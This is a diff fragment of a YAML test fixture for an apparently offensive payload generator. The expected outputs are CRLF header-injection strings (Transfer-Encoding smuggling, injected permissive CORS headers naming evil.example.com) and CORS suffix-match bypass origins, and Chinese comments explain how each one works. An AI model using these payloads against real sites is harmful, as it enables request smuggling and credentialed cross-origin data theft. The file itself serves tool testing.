+      outputs: [raw]
+    expect:
+      payload: "%0aTransfer-Encoding:%20chunked"
+
+  - name: crlf.generic.header.transfer_encoding · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: cr}
+      outputs: [raw]
+    expect:
+      payload: "%0dTransfer-Encoding:%20chunked"
+
+  - name: crlf.generic.header.transfer_encoding · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: raw}
+      outputs: [raw]
+    expect:
+      payload: "\r\nTransfer-Encoding:%20chunked"
+
+  - name: crlf.generic.header.transfer_encoding · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.header.transfer_encoding
+      slots: {nl: dbl}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aTransfer-Encoding:%20chunked"
+
+  # ---- crlf.generic.header.cors ----
+  # 这条 body 里 `<<nl.seq>>` 出现两次且**中间夹着变量**：槽位先填、变量后替换，
+  # 两处必须都展开成同一档换行。
+
+  - name: crlf.generic.header.cors · nl=crlf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: crlf}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0d%0aAccess-Control-Allow-Origin:%20https://evil.example.com%0d%0aAccess-Control-Allow-Credentials:%20true"
+
+  - name: crlf.generic.header.cors · nl=lf
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: lf}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0aAccess-Control-Allow-Origin:%20https://evil.example.com%0aAccess-Control-Allow-Credentials:%20true"
+
+  - name: crlf.generic.header.cors · nl=cr
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: cr}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%0dAccess-Control-Allow-Origin:%20https://evil.example.com%0dAccess-Control-Allow-Credentials:%20true"
+
+  - name: crlf.generic.header.cors · nl=raw
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: raw}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      # 两个真 CRLF：拆出独立一行的 Allow-Credentials，才拿到带凭据的跨站读权限
+      payload: "\r\nAccess-Control-Allow-Origin:%20https://evil.example.com\r\nAccess-Control-Allow-Credentials:%20true"
+
+  - name: crlf.generic.header.cors · nl=dbl
+    state:
+      vuln: crlf
+      template: crlf.generic.header.cors
+      slots: {nl: dbl}
+      vars: {evil: evil.example.com}
+      outputs: [raw]
+    expect:
+      payload: "%250d%250aAccess-Control-Allow-Origin:%20https://evil.example.com%250d%250aAccess-Control-Allow-Credentials:%20true"
+
+  # ================= cors.generic.probe.suffix · bypass =================
+  # 后缀匹配绕过：信任名单用「以 trusted.com 结尾」判定时，
+  # 造一个「前缀是攻击者域名、后缀是信任域名」的 Origin 就能过。
+  # origin 字段就是那截前缀，且两档的长度不同——label 是裸标签、full 带 .com。
+
+  - name: cors.generic.probe.suffix · bypass=label
+    state:
+      vuln: cors
+      template: cors.generic.probe.suffix
+      slots: {bypass: label}
+      vars: {trusted: target.com}
+      outputs: [raw]
+    expect:
+      # "evil" + "target.com" → eviltarget.com：注册一个 eviltarget.com 就够了
+      payload: "https://eviltarget.com"
+
+  - name: cors.generic.probe.suffix · bypass=full
+    state:
+      vuln: cors
+      template: cors.generic.probe.suffix
+      slots: {bypass: full}
+      vars: {trusted: target.com}
+      outputs: [raw]
+    expect:
+      # "evil.com" + "target.com" → evil.comtarget.com：要注册 evil.comtarget.com
+      payload: "https://evil.comtarget.com"
